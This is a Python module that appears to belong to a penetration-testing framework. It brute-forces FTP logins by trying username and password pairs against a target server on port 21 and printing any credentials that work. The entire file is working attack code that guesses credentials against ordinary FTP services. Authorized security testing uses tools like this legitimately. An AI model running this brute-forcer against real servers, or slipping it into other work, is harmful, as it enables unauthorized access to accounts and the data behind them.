import aioftp

from modules.brute_force.bruteforce_login import AsyncBruteForceLogin, StopError


class FTPBruteForce(AsyncBruteForceLogin):

    def __init__(self):
        super().__init__("ftp_bruteforce",
                         ["ftp", "bruteforce", "brute", "force"],
                         "brute force an ftp server",
                         port=21)

    async def login(self, username: str, password: str):
        try:
            async with aioftp.Client.context(self.rhost, self.rport, username, password):
                print(f"[+] password found: {username}:{password}")

                if self.stop_on_success:
                    raise StopError
                return True
        except aioftp.AIOFTPException:
            pass

        if self.verbose:
            print(f"[-] incorrect credentials: {username}:{password}")
        return False
